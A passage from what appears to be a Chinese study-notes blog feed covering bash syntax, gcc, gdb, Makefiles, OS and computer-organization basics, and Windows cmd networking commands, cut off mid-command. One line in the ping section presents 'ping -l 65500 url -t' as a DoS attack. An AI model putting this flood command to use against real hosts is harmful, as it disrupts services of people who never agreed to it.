后面跟变量（变量不带取值符号）</span></span><br></pre></td></tr></table></figure><h3 id="5-条件判断"><a href="#5-条件判断" class="headerlink" title="5 条件判断"></a>5 条件判断</h3><blockquote><p><a href="https://blog.csdn.net/lyndon_li/article/details/120735191">真与假</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="keyword">elif</span> condition</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">[ <span class="keyword">else</span> ]</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment"># condition：条件，带上 (( )) 或 [[ ]]（要空格隔开） （这中间再写 的 [] 之间不要用空格隔开 ）</span></span><br><span class="line"><span class="comment"># 写在同一行则每个语句后要带分号（分号前后紧跟）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> condition <span class="keyword">in</span></span><br><span class="line">num)</span><br><span class="line">statement</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">statement</span><br><span class="line">;;</span><br><span class="line"><span class="comment"># condition：不要带括号</span></span><br><span class="line"><span class="comment"># ;;：break</span></span><br><span class="line"><span class="comment"># *)：default</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断是否是字符设备</span></span><br><span class="line"><span class="keyword">if</span> [ -c <span class="string">&quot;<span class="variable">$filename</span>&quot;</span> ]</span><br></pre></td></tr></table></figure><h3 id="6-循环"><a href="#6-循环" class="headerlink" title="6 循环"></a>6 循环</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># C语言</span></span><br><span class="line"><span class="keyword">for</span> ((i=<span class="number">0</span>;i&lt;x;i+=<span class="number">1</span>))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">statement</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h3 id="7-函数"><a href="#7-函数" class="headerlink" title="7 函数"></a>7 函数</h3><ul><li><p>定义</p><ol><li><code>function func_name () &#123;&#125;</code></li><li><code>func_name () &#123;&#125;</code></li><li><code>function func_name &#123;&#125;</code></li></ol></li><li><p>return 返回值</p><blockquote><p>一般不用return返回函数中的值（容易出错）</p><p>一般用<code>$?</code></p></blockquote></li></ul><h3 id="8-运算符"><a href="#8-运算符" class="headerlink" title="8 运算符"></a>8 运算符</h3><ul><li>数值比较运算符</li></ul><div class="table-container"><table><thead><tr><th>符号</th><th>作用</th></tr></thead><tbody><tr><td>-eq -ne</td><td>等于，不等于</td></tr><tr><td>-gt -ge （Greater than it）</td><td>大于，大于等于</td></tr><tr><td>-lt -le（less than it）</td><td>小于，小于等于</td></tr></tbody></table></div><ul><li><p>逻辑运算符</p><blockquote><p>在括号内，括号外是 &amp;&amp; 和 || </p></blockquote></li></ul><div class="table-container"><table><thead><tr><th>符号</th><th>作用</th></tr></thead><tbody><tr><td>!</td><td>非</td></tr><tr><td>-o</td><td>或</td></tr><tr><td>-a</td><td>与</td></tr></tbody></table></div><ul><li>字符串检测运算符</li></ul><div class="table-container"><table><thead><tr><th>符号</th><th>作用</th></tr></thead><tbody><tr><td>=</td><td>等于</td></tr><tr><td>!=</td><td>不等于</td></tr><tr><td>-z</td><td>长度为0</td></tr><tr><td>-n</td><td>长度不为0</td></tr><tr><td>$</td><td>为空</td></tr></tbody></table></div><ul><li>文件测试运算符</li></ul><div class="table-container"><table><thead><tr><th>符号</th><th>作用</th></tr></thead><tbody><tr><td>-b</td><td>检测文件是否是块设备文件</td></tr><tr><td>-c</td><td>检测文件是否是字符设备文件</td></tr><tr><td>-d</td><td>检测文件是否是目录文件</td></tr><tr><td>-f</td><td>检测文件是否是普通文件（既不是目录也不是设备文件）</td></tr><tr><td>-g</td><td>检测文件是否设置了SGID位</td></tr><tr><td>-k</td><td>检测文件是否设置了粘着位（stucky Bit）</td></tr><tr><td>-p</td><td>检测文件是否具名管道</td></tr><tr><td>-u</td><td>检测文件是否设置了SUID位</td></tr><tr><td>-r</td><td>检测文件是否可读</td></tr><tr><td>-w</td><td>检测文件是否可写</td></tr><tr><td>-x</td><td>检测文件是否可执行</td></tr><tr><td>-s</td><td>检测文件是否为不为空（文件大小是否不为0）</td></tr><tr><td>-e</td><td>检测文件(包括目录)是否存在</td></tr><tr><td>-a</td><td>检测文件(包括目录)是否存在</td></tr><tr><td>-S</td><td>检测文件是否是套接字</td></tr><tr><td>-L</td><td>检测文件是否存在并且是一个符号链接</td></tr></tbody></table></div><hr><h2 id="九、GCC"><a href="#九、GCC" class="headerlink" title="九、GCC"></a>九、GCC</h2><h3 id="1-vi-vim编辑"><a href="#1-vi-vim编辑" class="headerlink" title="1 vi/vim编辑"></a>1 vi/vim编辑</h3><blockquote><p><a href="https://www.runoob.com/linux/linux-vim.html">vi/vim</a></p></blockquote><ul><li><p>命令模式</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:w <span class="comment"># 保存</span></span><br><span class="line">:q <span class="comment"># 退出</span></span><br></pre></td></tr></table></figure></li><li><p>编辑模式</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">i <span class="comment"># 进入编辑</span></span><br><span class="line">esc <span class="comment"># 退出编辑</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="2-安装gcc"><a href="#2-安装gcc" class="headerlink" title="2 安装gcc"></a>2 安装gcc</h3><ul><li>查看依赖关系：<code>apt-cache depends build-essential</code></li><li>安装gcc：<code>sudo apt install build-essential</code></li><li>查看版本：<code>gcc -v</code></li></ul><h3 id="3-GCC编译"><a href="#3-GCC编译" class="headerlink" title="3 GCC编译"></a>3 GCC编译</h3><blockquote><p>编译会重编译源文件，所以对于复杂项目来说未改动的源文件不需要再编译。</p></blockquote><ul><li><p>编译流程</p><ol><li>预处理（简化代码）：<code>gcc -E</code>（调用 cpp 生成 .i 文件）</li><li>编译（C到汇编）：<code>gcc -S</code>（调用 ccl 生成 .s 文件）</li><li>汇编（汇编到机器）：<code>gcc -c</code>（调用 as 生成 .o 文件）</li><li>链接（链接机器码）：<code>gcc</code>（调用 ld 生成文件）</li></ol><ul><li>直接输出：<code>gcc</code></li><li>指定输出文件：<code>-o zp</code></li><li>输出编译警告：<code>gcc -Wall</code></li></ul></li><li><p>复杂项目</p><blockquote><p>分别编译源文件再对编译后文件进行链接</p></blockquote><ol><li><code>gcc -c hello.c</code></li><li><code>gcc -c helloMain.c</code></li><li><code>gcc -o hello hello.c helloMain.c</code></li></ol></li><li><p>简单项目</p><blockquote><p>多个文件一起编译</p></blockquote><ul><li><code>gcc hello.c helloMain.c hello.h -o hello</code></li></ul></li></ul><h3 id="4-gdb调试"><a href="#4-gdb调试" class="headerlink" title="4 gdb调试"></a>4 gdb调试</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/357360607">gdb调试</a></p><p><code>gcc -g main.c</code>编译出的文件才可以被调试</p></blockquote><div class="table-container"><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>l ( list )</td><td>显示代码；list 行号——显示当前文件以“行号”为中心的前后10行代码；list 函数名——显示“函数名”所在函数的源代码。</td></tr><tr><td>b n( break )</td><td>设置端点，参数为行数或函数名；也可用“文件名：行数”或“文件名：函数名”</td></tr><tr><td>tb n( tbreak )</td><td>临时端点，参数同b</td></tr><tr><td>info b [ n ] ( i b/info break )</td><td>查看断点</td></tr><tr><td>info program</td><td>查看程序是否正在运行，程序进程号，被暂停的原因</td></tr><tr><td>clear n</td><td>清除第n行断点</td></tr><tr><td>d n ( delete )</td><td>删除第n个断点</td></tr><tr><td>disable n</td><td>暂停第n个断点</td></tr><tr><td>enable n</td><td>开启第n个断点</td></tr><tr><td>r ( run )</td><td>执行程序</td></tr><tr><td>s ( step )</td><td>有函数进入函数，无则单步执行</td></tr><tr><td>n ( next )</td><td>单步执行，不进入函数</td></tr><tr><td>c ( continue )</td><td>继续执行程序</td></tr><tr><td>p n( print )</td><td>打印表达式；表达式：变量，操作或函数调用</td></tr><tr><td>until</td><td>可以运行程序直到退出循环体</td></tr><tr><td>finish</td><td>运行程序（直到当前函数完成返回），并打印函数返回时的堆栈地址和返回值及参数等信息</td></tr><tr><td>watch n</td><td>设置监视点，一旦被监视的“表达式”的值改变，gdb将强行终止正在被调试的程序</td></tr><tr><td>frame n</td><td>移动到指定的帧栈，并打印栈的信息；n为帧编号，不指定n则打印当前栈的信息</td></tr><tr><td>set args n</td><td>指定运行时的参数</td></tr><tr><td>show args</td><td>查看设置好的参数</td></tr><tr><td>show paths</td><td>查看程序运行路径；set environment varname [ = value]设置环境变量；用show environment [ varname ]查看环境变量</td></tr><tr><td>cd / pwd</td><td>切换/显示路径</td></tr><tr><td>shell xxx</td><td>执行shell命令行，xxx为shell命令</td></tr><tr><td>bt ( backtrace)</td><td>查看堆栈；最下面是先执行的函数</td></tr><tr><td>threads</td><td>查看所有线程</td></tr><tr><td>thread n</td><td>切换线程，参数为线程号；线程号用threads查看（流程：threads——thread n——bt）</td></tr><tr><td>condition</td><td>给断点设置触发条件，如（b 10 if a &gt; b ( condition 1 if a &gt; b ) 等价 ( 假设b 10的断点号为1) ）；取消用condition 断点号</td></tr><tr><td>ignore</td><td>特殊断点条件，程序只有到达该断点指定次数后才会触发。如ignore 1 10（断点号1的断点过10次后触发）</td></tr><tr><td>kill</td><td>强行终止当前在调试的程序</td></tr><tr><td>help</td><td>帮助</td></tr><tr><td>call 函数（参数）</td><td>调用函数</td></tr><tr><td>layout</td><td>用于分割窗口。</td></tr><tr><td>layout src</td><td>显示源代码窗口</td></tr><tr><td>layout asm</td><td>显示反汇编窗口</td></tr><tr><td>layout regs</td><td>显示源代码/反汇编和CPU寄存器窗口</td></tr><tr><td>layout split</td><td>显示源代码和反汇编窗口</td></tr><tr><td>display</td><td>每次单步执行后输出被设置的表达式及值</td></tr><tr><td>stepi / nexti</td><td>单步跟踪一些机器指令</td></tr><tr><td>Ctrl + L</td><td>刷新窗口</td></tr><tr><td>q ( quit )</td><td>退出gdb</td></tr></tbody></table></div><h3 id="5-make-和-Makefile"><a href="#5-make-和-Makefile" class="headerlink" title="5 make 和 Makefile"></a>5 make 和 Makefile</h3><ol><li><p>生成Makefile文件</p></li><li><p>输入<br>`target… : prerequisties …</p><pre><code>         command         ...`</code></pre><blockquote><p>command前必须是tab而不是空格。</p><p>如果prerequisties中有一个以上的文件比target文件要新，command中定义的东西就会被执行。</p><p># 为注释，# 为输出井号。\可以换行，后面不可以接空格</p></blockquote><ul><li><p>例子</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">objects = main.o command.o</span><br><span class="line">edit:$(objects)</span><br><span class="line">        cc -o edit $(objects)</span><br><span class="line">$(objects):defs.h</span><br><span class="line">main.o:command.h</span><br><span class="line">command.o:buffer.h</span><br><span class="line">clean:</span><br><span class="line">        <span class="built_in">rm</span> edit $(objects)</span><br></pre></td></tr></table></figure></li></ul></li><li><p>执行</p><ul><li>make编译Makefile</li><li>执行clean：make clean</li></ul></li></ol><h3 id="6-Autotools-和-make-使用"><a href="#6-Autotools-和-make-使用" class="headerlink" title="6 Autotools 和 make 使用"></a>6 Autotools 和 make 使用</h3><blockquote><p><a href="http://www.cppblog.com/noflybird/archive/2010/01/20/82973.html">autotools&amp;make</a></p></blockquote><h2 id="十、Linux高级应用"><a href="#十、Linux高级应用" class="headerlink" title="十、Linux高级应用"></a>十、Linux高级应用</h2><ul><li><p><a href=".\c5fc2764">text::Kali Linux</a> </p></li><li><p>人工智能</p></li><li><p>区块链</p></li><li><p>大数据</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 操作系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 计算机系统 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机操作系统</title>
      <link href="/posts/dbeddcc1.html"/>
      <url>/posts/dbeddcc1.html</url>
      
        <content type="html"><![CDATA[<h1 id="计算机操作系统"><a href="#计算机操作系统" class="headerlink" title="计算机操作系统"></a>计算机操作系统</h1><hr><h2 id="一、计算机系统概述"><a href="#一、计算机系统概述" class="headerlink" title="一、计算机系统概述"></a>一、计算机系统概述</h2><h3 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1 基本概念"></a>1 基本概念</h3><ul><li><p>定义</p><blockquote><p>操作系统(Operation System, OS) 是指控制和管理整个计算机系统的硬件和软件资源，并合理的组织和调度计算机的工作和资源的分配，以提供给用户和其它软件方便的接口和环境，它是计算机系统中最基本的系统软件。</p><p>操作系统是计算机系统中最基本的系统软件。</p><p><a href="https://zhuanlan.zhihu.com/p/31444793">多道程序系统</a>：多道、宏观上并行、微观上串行。</p></blockquote></li><li><p>特征</p><blockquote><p>基本特征：并发、共享、虚拟、异步。</p></blockquote><ol><li>并发：两个或多个事件在同一时间间隔内发生。并行：同一时刻发生。</li><li>共享：互斥共享方式，临界资源。同时访问方式。</li><li>虚拟：虚拟化：对资源的逻辑抽象，隔离，再分配，管理的一个过程。虚拟机：通过软件模拟的具有完整硬件系统功能的、运行在一个完全隔离环境的完整计算机系统中。</li><li>异步：程序执行走走停停。</li></ol></li><li><p>目的和功能</p><ul><li>目的：处理机管理、存储器管理、文件管理、设备管理。</li><li>命令接口：联机命令接口（cmd），脱机命令接口（bat脚本）。</li><li>程序接口：由一组系哦听听歌调用（也称广义指令）组成。例：GUI。GUI不是操作系统一部分，但他调用的命令是。</li><li>裸机：没有任何软件支持（包括操作系统）。覆盖了软件的机器称为扩充机器或虚拟机。</li></ul></li></ul><h3 id="2-发展"><a href="#2-发展" class="headerlink" title="2 发展"></a>2 发展</h3><ul><li>手工操作阶段<ul><li>特点：无操作系统。用户独占全机，CPU等待手工操作。</li></ul></li><li>批处理阶段<ul><li>目的：解决人机矛盾及CPU和 I/O 设备之间速度的不匹配</li><li>单道批处理：自动性（自动下一个任务），顺序性，单道性。</li><li>多道批处理：多道，宏观上并行，微观上串行。</li></ul></li><li>分时操作系统<ul><li>原理：时间片导致分时，人机交互。</li><li>特点：同时性（多个终端用户同时用一台计算机），交互性，独立性（用户间互不干扰），及时性。</li></ul></li><li>实时操作系统<ul><li>目的：为了能在某个时间限制内完成某些紧急任务。</li><li>硬实时系统：某个动作必须在规定时刻完成。</li><li>软实时系统：偶尔违法时间规定且不会引起永久性损害。</li></ul></li><li>网络系统<ul><li>网络操作系统：利用网络把计算机连接起来，实现各台计算机间数据共享。</li><li>分布式计算机系统：协同工作的计算机系统。</li><li>两者区别：分布式可以协同工作。</li></ul></li><li>个人操作系统<ul><li>PC机</li></ul></li></ul><h3 id="3-操作系统运行环境"><a href="#3-操作系统运行环境" class="headerlink" title="3 操作系统运行环境"></a>3 操作系统运行环境</h3><ul><li><p>模式</p><ul><li>程序分类：内核程序，自编程序。</li><li>指令分类：特权分类，非特权分类。</li><li>状态：用户态（目态），核心态（管态、内核态）。</li><li>时钟：计时。通过时钟中断的管理，可以实现进程的切换。</li><li>中断：中断机制中，只有一小部分功能属于内核，它们负责保护和恢复中断现场的信息，转移控制权相关的处理程序。</li><li>原语：不可中断。</li></ul><blockquote><p>切换到用户态的指令也是特权指令。所以访管指令不是特权指令。</p><p>切换到核心态的指令是访管指令，从而产生一个中断事件将操作系统切换成核心态。</p><p>用户程序需要用到系统指令先需要切换到核心态再执行指令。</p></blockquote></li><li><p>中断</p><ul><li>中断（Interruption）：外中断，CPU外中断，可屏蔽中断和不可屏蔽中断，异常是不可屏蔽中断。</li><li>异常（Exception）：内中断，CPU内中断，故障（Fault），自陷（Trap），终止（Abort）。</li><li>故障（Fault）：指令引发的异常，例：除以0。</li><li>自陷（Trap）：事先安排的 “ 异常 ”，例：条件陷进指令。</li><li>终止（Abort）：CPU硬件故障，例：控制器出错。<br>​</li></ul></li></ul><h3 id="4-操作系统结构"><a href="#4-操作系统结构" class="headerlink" title="4 操作系统结构"></a>4 操作系统结构</h3><h3 id="5-操作系统引导"><a href="#5-操作系统引导" class="headerlink" title="5 操作系统引导"></a>5 操作系统引导</h3><h3 id="6-虚拟机"><a href="#6-虚拟机" class="headerlink" title="6 虚拟机"></a>6 虚拟机</h3><hr><h2 id="二、进程与线程"><a href="#二、进程与线程" class="headerlink" title="二、进程与线程"></a>二、进程与线程</h2><hr><h2 id="三、内存管理"><a href="#三、内存管理" class="headerlink" title="三、内存管理"></a>三、内存管理</h2><hr><h2 id="四、文件管理"><a href="#四、文件管理" class="headerlink" title="四、文件管理"></a>四、文件管理</h2><hr><h2 id="五、输入输出管理"><a href="#五、输入输出管理" class="headerlink" title="五、输入输出管理"></a>五、输入输出管理</h2><hr><h2 id="六、常见操作系统"><a href="#六、常见操作系统" class="headerlink" title="六、常见操作系统"></a>六、常见操作系统</h2><h3 id="1-Windows-7"><a href="#1-Windows-7" class="headerlink" title="1 Windows 7"></a>1 Windows 7</h3><blockquote><p><a href=".\3bb1b741">text::Windows操作系统</a></p></blockquote><h3 id="2-Linux"><a href="#2-Linux" class="headerlink" title="2 Linux"></a>2 Linux</h3><blockquote><p><a href=".\57602ae6">text::Ubuntu Linux</a></p></blockquote><hr><h2 id="七、操作系统安全"><a href="#七、操作系统安全" class="headerlink" title="七、操作系统安全"></a>七、操作系统安全</h2><ul><li><a href="https://www.cnblogs.com/ghostdot/p/12587199.html">删库跑路 </a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 操作系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 计算机系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理</title>
      <link href="/posts/8d4b7ae1.html"/>
      <url>/posts/8d4b7ae1.html</url>
      
        <content type="html"><![CDATA[<h1 id="计算机组成原理"><a href="#计算机组成原理" class="headerlink" title="计算机组成原理"></a>计算机组成原理</h1><hr><h2 id="一、计算机系统概述"><a href="#一、计算机系统概述" class="headerlink" title="一、计算机系统概述"></a>一、计算机系统概述</h2><h3 id="1-发展历程"><a href="#1-发展历程" class="headerlink" title="1 发展历程"></a>1 发展历程</h3><blockquote><p>（以微处理机为标志）电子管——晶体管——中小规模集成电路——超大规模集成电路。</p><p>摩尔定律：集成电路上可容纳的晶体管的数目，约每隔 18 个月便会增加一倍，性能也将提升一倍。</p></blockquote><h3 id="2-层次结构"><a href="#2-层次结构" class="headerlink" title="2 层次结构"></a>2 层次结构</h3><ul><li><p>基础</p><blockquote><p>硬件系统和软件系统共同构成了一个完整的计算机系统。</p><p>软硬件逻辑等价：软硬件都可以实现。<br>一般硬件直接实现效果要优。</p></blockquote></li><li><p>冯诺依曼机器</p><ol><li>存储程序工作方式。</li><li>运算器、存储器、控制器、输入设备、输出设备。</li><li>指令和数据通等地位放在存储器中，均为二进制码表示。</li></ol><ul><li><p>存储程序</p><blockquote><p>存储程序原理就是将我们为解决特定问题而编写的程序存放在<a href="https://baike.baidu.com/item/计算机存储器/786229?fromModule=lemma_inlink">计算机存储器</a>中，然后按存储器存储程序的首地址执行程序的第一条指令。以后就按照该程序的规定顺序执行其他指令，直至程序结束执行。</p></blockquote></li><li><p>存储器</p><blockquote><p>地址存储器（MAR）、数据存储器（MDR）。</p></blockquote></li><li><p>运算器</p><blockquote><p>核心是算术逻辑单元（ALU）。</p></blockquote></li><li><p>控制器</p><blockquote><p>程序计数器（PC）、指令寄存器（IR）和控制单元（CU）。</p></blockquote></li></ul></li><li><p>计算机软件</p><ul><li>系统软件：一组保证计算机系统高效、正确运行的基础软件。（OS，DBMS等）</li><li>应用软件：用户为解决某个应用领域中的各类问题而编制的程序。</li><li>机器语言、汇编语言、高级语言。</li></ul></li><li><p>层次结构</p><ol><li>微程序机器层</li><li>传统机器层</li><li>操作系统层（操作系统是由机器指令和广义指令组成，又叫混合层）</li><li>汇编语言层</li><li>高级语言层</li></ol><blockquote><p>层次之间关系紧密，下层是上层的基础，上层是下层的扩展。</p><p>没有配备软件的纯硬件系统成为裸机。</p><p>软件和硬件之间的界面就是指令集体系结构（ISA）。</p></blockquote></li><li><p>工作原理</p><ul><li>存储程序工作：——&gt;PC取指——&gt;指令译码，PC+=1——&gt;取数执行——&gt;送结果——</li><li>编译：预处理——&gt;编译——&gt;汇编——&gt;链接</li></ul></li></ul><h3 id="3-性能指标"><a href="#3-性能指标" class="headerlink" title="3 性能指标"></a>3 性能指标</h3><hr><h2 id="二、数据表示和运算"><a href="#二、数据表示和运算" class="headerlink" title="二、数据表示和运算"></a>二、数据表示和运算</h2><h3 id="1-进制与编码"><a href="#1-进制与编码" class="headerlink" title="1 进制与编码"></a>1 进制与编码</h3><h4 id="gt-十六进制负数判断技巧"><a href="#gt-十六进制负数判断技巧" class="headerlink" title="=&gt;十六进制负数判断技巧"></a>=&gt;十六进制负数判断技巧</h4><blockquote><p>因为最高位为符号位，所以用二进制看1后面跟n个零即为负数的起始位置，而0后面跟n个1为整数的结束位置，也就是可以表示的最大正数。以0xFF两位十六进制数为例，由上面结论可知：0-0x7F为正数，0x80-0xFF为负数，依次类推。</p></blockquote><h3 id="2-运算方法和运算电路"><a href="#2-运算方法和运算电路" class="headerlink" title="2 运算方法和运算电路"></a>2 运算方法和运算电路</h3><h3 id="3-浮点数表示和运算"><a href="#3-浮点数表示和运算" class="headerlink" title="3 浮点数表示和运算"></a>3 浮点数表示和运算</h3><hr><h2 id="三、存储系统"><a href="#三、存储系统" class="headerlink" title="三、存储系统"></a>三、存储系统</h2><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1 概述"></a>1 概述</h3><h3 id="2-主存"><a href="#2-主存" class="headerlink" title="2 主存"></a>2 主存</h3><h3 id="3-主存与CPU的连接"><a href="#3-主存与CPU的连接" class="headerlink" title="3 主存与CPU的连接"></a>3 主存与CPU的连接</h3><h3 id="4-外存"><a href="#4-外存" class="headerlink" title="4 外存"></a>4 外存</h3><h3 id="5-Cache"><a href="#5-Cache" class="headerlink" title="5 Cache"></a>5 Cache</h3><h3 id="6-虚存"><a href="#6-虚存" class="headerlink" title="6 虚存"></a>6 虚存</h3><hr><h2 id="四、指令系统"><a href="#四、指令系统" class="headerlink" title="四、指令系统"></a>四、指令系统</h2><h3 id="1-格式"><a href="#1-格式" class="headerlink" title="1 格式"></a>1 格式</h3><hr><h2 id="五、中央处理器"><a href="#五、中央处理器" class="headerlink" title="五、中央处理器"></a>五、中央处理器</h2><h3 id="1-CPU基础"><a href="#1-CPU基础" class="headerlink" title="1 CPU基础"></a>1 CPU基础</h3><ul><li><p>基本功能</p><blockquote><p>中央处理器（CPU）由运算器和控制器组成。</p></blockquote><ul><li>指令控制</li><li>操作控制</li><li>时间控制</li><li>数据加工</li><li>中断处理</li></ul></li><li><p>运算器</p><ul><li>算术逻辑单元</li><li>暂存寄存器</li><li>累加寄存器</li><li>通用寄存器组</li><li>程序状态字寄存器</li><li>移位器</li><li>计数器</li></ul></li><li><p>控制器</p><ul><li>程序计数器（PC）</li><li>指令寄存器（IR）</li><li>指令译码器</li><li>存储器地址寄存器（MAR）</li><li>存储器数据寄存器（MDR）</li><li>时序系统</li><li>微操作信号发生器</li></ul></li></ul><hr><h2 id="六、总线"><a href="#六、总线" class="headerlink" title="六、总线"></a>六、总线</h2><hr><h2 id="七、输入输出系统"><a href="#七、输入输出系统" class="headerlink" title="七、输入输出系统"></a>七、输入输出系统</h2>]]></content>
      
      
      <categories>
          
          <category> 操作系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 计算机系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows操作系统</title>
      <link href="/posts/3bb1b741.html"/>
      <url>/posts/3bb1b741.html</url>
      
        <content type="html"><![CDATA[<h1 id="Windows操作系统"><a href="#Windows操作系统" class="headerlink" title="Windows操作系统"></a>Windows操作系统</h1><hr><h2 id="一、Windows使用"><a href="#一、Windows使用" class="headerlink" title="一、Windows使用"></a>一、Windows使用</h2><h3 id="1-控制面板"><a href="#1-控制面板" class="headerlink" title="1 控制面板"></a>1 控制面板</h3><h4 id="1-1-网络共享"><a href="#1-1-网络共享" class="headerlink" title="1.1 网络共享"></a>1.1 网络共享</h4><blockquote><p>高级选项——开启 / 关闭网络共享</p></blockquote><h3 id="2-快捷键"><a href="#2-快捷键" class="headerlink" title="2 快捷键"></a>2 快捷键</h3><h4 id="2-1-选取"><a href="#2-1-选取" class="headerlink" title="2.1 选取"></a>2.1 选取</h4><blockquote><p>Home / End：行首 / 尾</p><p>ctrl + Home / End ：从光标处到行首 / 尾</p><p>ctrl + shift + Home / End ：全选至行首 / 尾</p><p>ctrl + A：选取全部</p><p>ctrl + W：关闭所选文本</p><p>alt + tab：切屏</p></blockquote><h4 id="2-2-撤回"><a href="#2-2-撤回" class="headerlink" title="2.2 撤回"></a>2.2 撤回</h4><blockquote><p>ctrl + z 撤回</p><p>ctrl + shift + z 前进</p></blockquote><h4 id="2-3-复制"><a href="#2-3-复制" class="headerlink" title="2.3 复制"></a>2.3 复制</h4><blockquote><p>ctrl + c 复制</p><p>ctrl + v 粘贴</p><p>ctrl + x 剪切</p></blockquote><hr><h2 id="二、CMD命令"><a href="#二、CMD命令" class="headerlink" title="二、CMD命令"></a>二、CMD命令</h2><h3 id="1-命令类型"><a href="#1-命令类型" class="headerlink" title="1 命令类型"></a>1 命令类型</h3><ul><li><p>内部命令：物理内存中的一部分，系统自带，如：copy</p></li><li><p>外部命令：调用了C盘中的程序（命令可以改），如：mstsc（远程桌面），ping</p><blockquote><p>外部命令可以下载安装，放入C:\Windows\System32可直接使用。</p></blockquote></li></ul><h3 id="2-帮助"><a href="#2-帮助" class="headerlink" title="2 帮助"></a>2 帮助</h3><ul><li>win+R 输入cmd打开cmd</li><li>命令 + /?：显示命令帮助</li></ul><h3 id="3-界面"><a href="#3-界面" class="headerlink" title="3 界面"></a>3 界面</h3><h4 id="3-1-自定义DOS界面"><a href="#3-1-自定义DOS界面" class="headerlink" title="3.1 自定义DOS界面"></a>3.1 自定义DOS界面</h4><ul><li><p><code>title + name</code>：标题</p></li><li><p><code>mode</code>：显示样式设置</p><blockquote><p><code>mode row,col</code>：设置行列值</p></blockquote></li><li><p>color Tens</p><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">颜色整数值：Ten digits：背景颜色，one digit：字体颜色</span><br><span class="line"><span class="built_in">title</span> <span class="built_in">cmd</span> demo</span><br><span class="line"><span class="built_in">mode</span> <span class="number">12</span>,<span class="number">24</span></span><br><span class="line"><span class="built_in">color</span> <span class="number">07</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="3-2-chcp"><a href="#3-2-chcp" class="headerlink" title="3.2 chcp"></a>3.2 chcp</h4><blockquote><p><a href="https://www.csdn.net/tags/MtjaEg4sMjE2NzYtYmxvZwO0O0OO0O0O.html#code_page_2"> &lt;其他&gt;参考连接</a></p></blockquote><ul><li><p><code>chcp</code>：查看当前编码 </p></li><li><p><code>chcp [nnn]</code>：修改当前编码 </p></li><li><p>一般编码代码</p></li></ul><div class="table-container"><table><thead><tr><th>语言</th><th>编码代码</th></tr></thead><tbody><tr><td>UTF-8</td><td>65001</td></tr><tr><td>简体中文（GB2312）</td><td>936</td></tr><tr><td>繁体中文BIG5</td><td>950</td></tr><tr><td>日文</td><td>932</td></tr><tr><td>美国/加拿大英语</td><td>437</td></tr><tr><td>俄文</td><td>866</td></tr><tr><td>韩文</td><td>949</td></tr></tbody></table></div><h3 id="4-网络"><a href="#4-网络" class="headerlink" title="4 网络"></a>4 网络</h3><h4 id="4-1-wget"><a href="#4-1-wget" class="headerlink" title="4.1 wget"></a>4.1 wget</h4><blockquote><p><code>wget + url</code>：爬取网站（存到当前路径下）</p></blockquote><ul><li>-r：递归全部爬取（慎用）</li><li>-l：设置层次</li><li>-o：设置输出位置</li></ul><h4 id="4-2-ipconfig"><a href="#4-2-ipconfig" class="headerlink" title="4.2 ipconfig"></a>4.2 ipconfig</h4><blockquote><p>ipconfig ：显示网络配置</p></blockquote><ul><li>/all：显示详细信息</li><li>/release：释放IP</li><li>/renew：重新获取IP</li><li>/flushdns：刷新DNS</li></ul><h4 id="4-3-ping"><a href="#4-3-ping" class="headerlink" title="4.3 ping"></a>4.3 ping</h4><blockquote><p>ping domain/IP：检测网络连通性。</p></blockquote><ul><li>-t：一直ping直到停止</li><li>-a：地址解析为主机名</li><li>-n num：指定数据包数量</li><li>-l large：指定数据包大小（字节）</li><li>-w timeout：指定超时时间（毫秒）（存疑：-w设置为大于0的数都能ping通）</li></ul><blockquote><p>DOS攻击：ping -l 65500 url -t</p><p>电脑打开热点后无法ping通127.0.0.1</p></blockquote><h4 id="4-4-telnet"><a href="#4-4-telnet" class="headerlink" title="4.4 telnet"></a>4.4 telnet</h4><blockquote><p>打开telnet：control——程序和功能——启动或关闭Windows功能——Telnet客户端</p><p><code>telnet [host [port]]</code>：连接端口（可用于检测端口是否开放）</p></blockquote><h4 id="4-5-netstat"><a href="#4-5-netstat" class="headerlink" title="4.5 netstat"></a>4.5 netstat</h4><blockquote><p>netstat：显示协议统计信息和TCP/IP状态</p></blockquote><ul><li>命令参数<ul><li>-a：详细</li><li>-n：外部地址显示为 IP:port</li><li>-o：关联的进程号</li><li>-r：路由表</li></ul></li><li>状态<ul><li>LISTENING（监听）</li><li>ESTABLISHED（连接）</li><li>CLOSED（关闭）</li><li>TIME-WAIT（等待足够时间）</li></ul></li></ul><h4 id="4-6-netsh"><a href="#4-6-netsh" class="headerlink" title="4.6 netsh"></a>4.6 netsh</h4><ul><li><p>网络配置</p><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">netsh——int ip：进行ipv4配置</span><br><span class="line"><span class="built_in">set</span> address name=&quot;本地连接&quot; source=static/dhcp (addr=ip 